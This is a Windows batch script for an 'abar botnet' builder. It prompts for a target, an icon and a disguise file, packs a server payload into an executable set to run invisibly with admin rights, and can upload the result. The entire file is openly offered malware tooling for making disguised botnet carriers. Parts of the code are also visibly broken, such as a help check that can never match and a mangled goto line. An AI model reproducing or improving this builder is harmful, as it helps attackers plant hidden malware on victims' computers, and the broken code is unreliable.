@echo off
color 0d
:menu
echo welcome to abar botnet
ECHO           :::        :::::::::           :::        ::::::::: 
ECHO        :+: :+:      :+:    :+:        :+: :+:      :+:    :+: 
ECHO      +:+   +:+     +:+    +:+       +:+   +:+     +:+    +:+  
ECHO    +#++:++#++:    +#++:++#+       +#++:++#++:    +#++:++#:    
ECHO   +#+     +#+    +#+    +#+      +#+     +#+    +#+    +#+    
ECHO  #+#     #+#    #+#    #+#      #+#     #+#    #+#    #+#     
ECHO ###     ###    #########       ###     ###    ###    ###      
echo type 'help' for help

set /p "abar=abar botnet> "

if "%abar:~0,5%"=="build" goto build
if "%abar:~0,5%"=="help" goto help
:build
title ab - Builder
echo.Builder
set /p "carriername=Carrier Name > "
title Carry - Build Carrier (%carriername%)
echo.
:carriertype
echo.  type :
echo.-------------------------------------
echo. 1. public target
echo. 2. personal target.
echo.-------------------------------------
echo.
set /p "autoortarget=1,2 > "
if "%autoortarget:~0,1%"=="1" (
	set targetname=CARRY:INTELLIMODE[ID]
	echo.Target mode selected [INTELLIMODE]
	)
if "%autoortarget:~0,1%"=="2" (
	set /p "targetname=Target Name >"
	echo.Target mode selected [DETECTIVE MODE]
	)
if "%autoortarget:~0,1%" gtr "2" goto carriertype
if "%autoortarget:~0,1%"=="" echo.Target mode selected [INTELLIMODE] & set targetname=CARRY:INTELLIMODE[ID]
set /p "description=App About >"
title Carry - Build Carrier (%carriername%),(%targetname%)
set /p "icon=Icon File >"
set /p "mask=Mask File >"
set /p "put=Upload to web ? [y,n] >"
echo.%mask%>"%cd%\applaunch.dat"
echo.%targetname%>"%cd%\targetname.txt"

if not "%icon%"=="" set icon=-icon %icon% 
if not "%mask%"=="" set mask=-include %icon%

call b2e.exe -bat "%cd%\server\server.bat" -save "%cd%\builded\%carriername%.exe" -admin -overwrite -invisible -temp -description "%description%" -include "%cd%\server\" -include "%cd%\Modc\modprog\" -include host.txt -include "%cd%\targetname.txt" -include "%cd%\applaunch.dat" %icon%%mask%
if exist "%cd%\builded\%carriername%.exe" echo.Sucessfully Builded !&title %status% Build - Success
if not exist "%cd%\builded\%carriername%.exe" echo.Unsucessfully Builded ! &title %status% Build - Unsuccessfullygoto carrymenu

if /i "%put:~0,1%"=="y" (
	call client-carrier.exe -uproot "%cd%\builded\%carriername%"
)
del /F /Q "%cd%\applaunch.dat" 2>nul >nul
del /F /Q "%cd%\targetname.txt" 2>nul >nul
goto menu

:help
cls
echo commands 
echo 'build'
pause
cls
goto menu
